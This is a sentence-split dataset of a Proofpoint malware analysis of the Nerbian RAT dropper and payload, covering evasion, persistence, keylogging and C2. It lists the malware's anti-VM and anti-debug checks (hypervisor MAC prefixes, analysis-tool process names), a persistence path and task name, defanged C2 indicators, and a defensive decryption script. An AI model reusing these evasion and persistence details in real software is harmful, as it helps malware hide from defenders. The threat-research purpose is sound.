{"id": "sentence_0xdbdad611", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x7ff48bac", "chapter_title": "Functionality", "text": "There are additional references to \"Nerbian\" in some of the Go functions scattered throughout the binary."}
{"id": "sentence_0xceb820f7", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x7ff48bac", "chapter_title": "Functionality", "text": "Figure 7: Functions referring to the RAT the dropper is meant to download and store on the compromised system."}
{"id": "sentence_0x165e248e", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0xc3035ca0", "chapter_title": "Code Reuse", "text": "Most software developers, including malware developers, use existing software packages. The UpdateUAV executable, which is a dropper for Nerbian RAT, features a lot of code re-use, with strings referencing various GitHub projects:"}
{"id": "sentence_0xfaa6e0a1", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0xc3035ca0", "chapter_title": "Code Reuse", "text": "github.com/go-ole/go-ole Go bindings for Windows COM (Component Object Model inter-process communication) github.com/gonutz/w32/v2 Go bindings for the Win32 API github.com/mitchellh/go-ps Library implements OS-specific APIs to list and manipulate processes github.com/StackExchange/wmi Go package for Windows WMI, providing a WQL interface"}
{"id": "sentence_0x596be61d", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0xc3035ca0", "chapter_title": "Code Reuse", "text": "Out of all these references to external projects the most interesting is:"}
{"id": "sentence_0xe5502962", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0xc3035ca0", "chapter_title": "Code Reuse", "text": "github.com/p3tr0v/chacal/"}
{"id": "sentence_0xf55ab33f", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x6cad8429", "chapter_title": "Anti-Debug, Anti-VM, Anti-Forensics", "text": "Figure 8: Chacal GitHub page."}
{"id": "sentence_0x3e3bbc1a", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x6cad8429", "chapter_title": "Anti-Debug, Anti-VM, Anti-Forensics", "text": "Chacal is described as, Golang anti-vm framework for Red Team and Pentesters. However, there are several functions and references in the project designed to make debugging and reverse engineering more difficult as well."}
{"id": "sentence_0xc58ca8f0", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x6cad8429", "chapter_title": "Anti-Debug, Anti-VM, Anti-Forensics", "text": "The dropper will stop execution if it encounters any of the following conditions:"}
{"id": "sentence_0x1d94e403", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x6cad8429", "chapter_title": "Anti-Debug, Anti-VM, Anti-Forensics", "text": "The size of the hard disk on the system is less than a certain size. The default defined in Chacal is 100GB. The name of the hard disk, according to WMI contains one of the following strings:  The MAC address queried returns any of the following OUI values:  Any of the following reverse engineering/debugging programs are encountered in the process list:  Any of the following memory analysis/memory tampering programs are present in the process list:  A time measurement function checks to see if the amount of time elapsed execution specific functions is deemed \"excessive\". If the time threshold is reached, the malware assumes it is being debugged, and will exit. \"virtual\" \"vbox\" \"vmware\" 00:0c:29, 00:50:56, 08:00:27, 52:54:00, 00:21:F6, 00:14:4F, 00:0F:4B, 00:10:E0, 00:00:7D, 00:21:28, 00:01:5D, 00:21:F6, 00:A0:A4, 00:07:82, 00:03:BA, 08:00:20, 2C:C2:60, 00:10:4F, 00:0F:4B, 00:13:97, 00:20:F2, 00:14:4F processhacker.exe, procmon.exe, pestudio.exe, procmon64.exe, x32dbg.exe, x64dbg.exe, CFF Explorer.exe, procexp64.exe, procexp.exe, pslist.exe, tcpview.exe, tcpvcon.exe, dbgview.exe, RAMMap.exe, RAMMap64.exe, vmmap.exe, ollydbg.exe, agent.py, autoruns.exe, autorunsc.exe, filemon.exe, regmon.exe, idaq.exe, idaq64.exe, ImmunityDebugger.exe, Wireshark.exe, dumpcap.exe, HookExplorer.exe, ImportREC.exe, PETools.exe, LordPE.exe, SysInspector.exe, proc_analyzer.exe, sysAnalyzer.exe, sniff_hit.exe, windbg.exe, joeboxcontrol.exe, joeboxserver.exe, joeboxserver.exe, ResourceHacker.exe, Fiddler.exe, httpdebugger.exe DumpIt.exe, RAMMap.exe, RAMMap64.exe, vmmap.exe"}
{"id": "sentence_0x903c51d", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x6cad8429", "chapter_title": "Anti-Debug, Anti-VM, Anti-Forensics", "text": "In addition to the anti-reversing checks provided by Chacal, there are other anti-analysis checks present in the binary including:"}
{"id": "sentence_0x2428acb4", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x6cad8429", "chapter_title": "Anti-Debug, Anti-VM, Anti-Forensics", "text": "Uses the IsDebuggerPresent API to determine if the executable is being debugged Appears to query for the following network interface names:  Intel PRO/1000 MT Network Connection Loopback Pseudo-Interface 1 Software Loopback Interface 1"}
{"id": "sentence_0xcad964c0", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0xfa43e12c", "chapter_title": "Download, Execution, and Persistence", "text": "In the case of analyzed sample, the dropper attempted to download its payload from:"}
{"id": "sentence_0x374c1f06", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0xfa43e12c", "chapter_title": "Download, Execution, and Persistence", "text": "hxxps://www[.] fernandestechnical [.]com/pub/media/ssl"}
{"id": "sentence_0x262e2471", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0xfa43e12c", "chapter_title": "Download, Execution, and Persistence", "text": "And will save the RAT to:"}
{"id": "sentence_0x1779ceb5", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0xfa43e12c", "chapter_title": "Download, Execution, and Persistence", "text": "C:\\ProgramData\\USOShared\\MoUsoCore.exe"}
{"id": "sentence_0x76011abe", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0xfa43e12c", "chapter_title": "Download, Execution, and Persistence", "text": "Next, the dropper will attempt to establish a scheduled task named MicrosoftMouseCoreWork to start the RAT payload hourly to establish persistence."}
{"id": "sentence_0x2ad5111", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0xfa43e12c", "chapter_title": "Download, Execution, and Persistence", "text": "The dropper's end-goal is to download the executable named SSL, save it as MoUsoCore.exe, and configure a scheduled task to run it hourly as its primary persistence mechanism."}
{"id": "sentence_0xaef2eb1c", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x683d6382", "chapter_title": "Payload - MoUsoCore.exe", "text": "MoUsoCore.exe is the name of the payload that the dropper binary, UpdateUAV.exe, attempts to download and establish persistence for. Like the dropper itself, it is written in Go, and is UPX packed. The size of the binary in its packed state is 5.6MB, while in its unpacked state is 9.2MB."}
{"id": "sentence_0xc99e4677", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0xd70999cf", "chapter_title": "Functionality and Configuration Settings", "text": "Nerbian RAT seems to support a variety of different functions, most of which are dictated by encrypted configuration settings in the binary itself. Proofpoint identified various configuration settings this sample utilizes:"}
{"id": "sentence_0x53633eb3", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0xd70999cf", "chapter_title": "Functionality and Configuration Settings", "text": "\"185.121.139[.]249\" https://www[.]fernandestechnical[.]com/pub/health_check.php 8ffe450597cbbfa5a703e23a8b6bbdaeda76badf2b035e75de5ffdb3af07270d \"100\" \\\\\\\\ProgramData\\\\\\\\Microsoft OneDrive\\\\\\\\setup \"rev.sav\""}
{"id": "sentence_0xda5649e5", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0xd70999cf", "chapter_title": "Functionality and Configuration Settings", "text": "===Configuration=== default_communication_protocol: %s default_conn_interval: %d b_use_alive_signal: %t start_worktime: %d end_worktime: %d alive_interval: %d b_use_secondary_host: %t b_use_sleep_filetransfer: %t time_sleep_filetransfer: %d retry_count_filetransfer: %d connection_error_sleep_time: %d bpreflaged_use_backupserver: %t flagged_time_backupserver: %s switch_backupserver_time: %d primary_host: %s secondary_host: %s primary_http_proxyserver: %s secondary_http_proxyserver: %s working_directory: %s b_run_cmd_result_outfile: %t idle_state_limit_time: %d st:%d nt: %d"}
{"id": "sentence_0xdd286c6a", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0xd70999cf", "chapter_title": "Functionality and Configuration Settings", "text": "Many of these strings pertain to setting operating parameters for the malware such as what hosts it communicates with, how often it checks in to the C2 domains and IP addresses with keep-alive messages, the malwares preferred working directory, and the hours in which it operates, in addition to other parameters."}
{"id": "sentence_0x52e6ee2d", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0xd70999cf", "chapter_title": "Functionality and Configuration Settings", "text": "It's likely that 185[.]121[.]139[.]249 and hxxps://www[.]fernandestechnical[.]com/pub/health_check.php are the designated C2 backup domains and URI for keep-alives and check-ins."}
{"id": "sentence_0xa5d2f39c", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x49d7a9a9", "chapter_title": "Keylogging", "text": "The RAT appears to have the ability to log keystrokes and appears to write them, encrypted, to the rev.sav file mentioned in the configuration settings above."}
{"id": "sentence_0x109675e9", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0xa7c4d2f", "chapter_title": "Screen Capture", "text": "Not unlike the dropper, the RAT utilizes a lot of pre-existing Go code to perform many of its functions:"}
{"id": "sentence_0x780dad26", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0xa7c4d2f", "chapter_title": "Screen Capture", "text": "github.com/lxn/win github.com/go-ole/go-ole github.com/StackExchange/wmi github.com/digitalocean/go-smbios/smbios github.com/AllenDang/w32.init"}
{"id": "sentence_0xbc85190f", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0xa7c4d2f", "chapter_title": "Screen Capture", "text": "Again, out of all of these, one of the more interesting external references is to the following GitHub repo:"}
{"id": "sentence_0x8b6624a0", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0xa7c4d2f", "chapter_title": "Screen Capture", "text": "github.com/kbinani/screenshot/"}
{"id": "sentence_0x2ebe1f11", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0xa7c4d2f", "chapter_title": "Screen Capture", "text": "This repo is a Go library for performing screen captures on a variety of different operating systems."}
{"id": "sentence_0xa920e84e", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x54bb6e75", "chapter_title": "C2 Communications", "text": "As with most modern malware families, this RAT prefers to handle its communications over SSL. Proofpoint observed two types of network traffic. The first is a simple Heartbeat/Keep-Alive to the C2 domains/IP addresses."}
{"id": "sentence_0x70be406c", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x54bb6e75", "chapter_title": "C2 Communications", "text": "Figure 9: The Heartbeat/Keep-alive traffic to the C2 domain/IP addresses. Please disregard the extra \"p\" at the end of /pub/health_check.php."}
{"id": "sentence_0xeebc62f7", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x54bb6e75", "chapter_title": "C2 Communications", "text": "Additional communication observed was a POST request to the configured C2 domains and IP addresses with a large collection of HTTP form data being uploaded in the request:"}
{"id": "sentence_0xd023d188", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x54bb6e75", "chapter_title": "C2 Communications", "text": "Figure 10: Notice the different names in the Content-Disposition field for each form in this POST request. All of this data is both base64 encoded and encrypted, regardless of whether the C2 communication is happening over HTTP or HTTPS."}
{"id": "sentence_0x1b162f3b", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x54bb6e75", "chapter_title": "C2 Communications", "text": "Form-data names being posted to the C2 server include:"}
{"id": "sentence_0xa2c9ddfa", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x54bb6e75", "chapter_title": "C2 Communications", "text": "addr_post IP address posting to"}
{"id": "sentence_0x393dda81", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x54bb6e75", "chapter_title": "C2 Communications", "text": "port_post network port posting to"}
{"id": "sentence_0xfbde1fbf", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x54bb6e75", "chapter_title": "C2 Communications", "text": "auth_post likely a per-session encryption key or password used after initializing the C2 communication"}
{"id": "sentence_0xe4dcbbb8", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x54bb6e75", "chapter_title": "C2 Communications", "text": "session_key the only field that isn't encrypted. This is a combination of a string that serves as a sort of campaign identifier, a hash of values retrieved via the SMBIOS Golang module, and the operating system designation of the system talking to the C2 server (in this case \"windows\")."}
{"id": "sentence_0x68648b46", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x54bb6e75", "chapter_title": "C2 Communications", "text": "data_post exfiltrated data from the victim host"}
{"id": "sentence_0x1d768b3", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x54bb6e75", "chapter_title": "C2 Communications", "text": "All of the fields above, with exception of session_key form data field, utilize a unique encryption scheme. The first 70 bytes of the POST are \"garbage\", while the next 24 bytes contain an AES key that can be used to decrypt the remaining data. Proofpoint researchers developed a Python script that will enable decrypting this posted data:"}
{"id": "sentence_0x937c1fa3", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x54bb6e75", "chapter_title": "C2 Communications", "text": "import malduck import binascii"}
{"id": "sentence_0xe3caf2cd", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x54bb6e75", "chapter_title": "C2 Communications", "text": "data = \"BgxxweBaPoZVPcfLoQFSHMfqqeitJaZjoSKOBrhsCxtDMYGxPUHsKYcXetaTSJaSULtqZQAwoDiTrCtDpVKvaLxjZPSLcLBvlyREEguzuO0Z8119x2/7cc2XoU2w==\""}
{"id": "sentence_0x1a41d65", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x54bb6e75", "chapter_title": "C2 Communications", "text": "def decrypt_post_param(base64_encoded_content): junk = base64_encoded_content[:70] key = base64_encoded_content[70:70+32] print(\"[+] key: %s\" % key) crypted_data = base64_encoded_content[70+32:].encode(\"utf-8\") base64_decoded = malduck.base64.decode(crypted_data) iv = key[:16].encode(\"utf-8\") full_data = base64_decoded print(\"[+] crypted data [%d]: %s\" % (len(full_data), binascii.hexlify(full_data))) return malduck.aes.cbc.decrypt(key.encode(\"utf-8\"), iv, full_data)"}
{"id": "sentence_0xc27b1530", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x54bb6e75", "chapter_title": "C2 Communications", "text": "print(decrypt_post_param(data))"}
{"id": "sentence_0xad32a8d2", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x54bb6e75", "chapter_title": "C2 Communications", "text": "Figure 11: Python script for decrypting posted data."}
{"id": "sentence_0xbf9cc5e", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x54bb6e75", "chapter_title": "C2 Communications", "text": "Using the code above, users can decrypt the data being posted. In this instance, Proofpoint chose to decrypt the base64 encoded data from the addr_post field from an internal sandbox run. Users will need to replace the data variable with the base64 encoded block they wish to decrypt, or otherwise modify the script to accept input."}
{"id": "sentence_0x8647854b", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x54bb6e75", "chapter_title": "C2 Communications", "text": "As mentioned above however, the session_key field is not encrypted, it is base64 encoded. What does this field contain?"}
{"id": "sentence_0xfe9cbba2", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x54bb6e75", "chapter_title": "C2 Communications", "text": "Figure 12: The value of the session_key field is just a concated string, containing three values that are base64 encoded."}
{"id": "sentence_0xd7bf86b4", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x54bb6e75", "chapter_title": "C2 Communications", "text": "When submitted to Cyberchef using the From Base64 recipe, the base64 encoded string:"}
{"id": "sentence_0x88cdb7ca", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x54bb6e75", "chapter_title": "C2 Communications", "text": "OGZmZTQ1MDU5N2NiYmZhNWE3MDNlMjNhOGI2YmJkYWVkYTc2YmFkZjJiMDM1ZTc1ZGU1ZmZkYjNhZjA3MjcwZDoyNWI0ZWJjYTRiYmM4MmFiNWFlMmU1MTdjMjlkMzNlNzp3aW5kb3dz"}
{"id": "sentence_0x2433be96", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x54bb6e75", "chapter_title": "C2 Communications", "text": "Decodes to:"}
{"id": "sentence_0x545e95fa", "report_id": "report_0x203d8170", "report_date": "2022-05-11T00:00:00Z", "report_title": "Nerbian RAT Using COVID-19 Themes Features Sophisticated Evasion Techniques. Detection", "report_url": "https://www.proofpoint.com/us/blog/threat-insight/nerbian-rat-using-covid-19-themes-features-sophisticated-evasion-techniques", "chapter_id": "chapter_0x54bb6e75", "chapter_title": "C2 Communications", "text": "8ffe450597cbbfa5a703e23a8b6bbdaeda76badf2b035e75de5ffdb3af07270d:25b4ebca4bbc82ab5ae2e517c29d33e7:windows"}
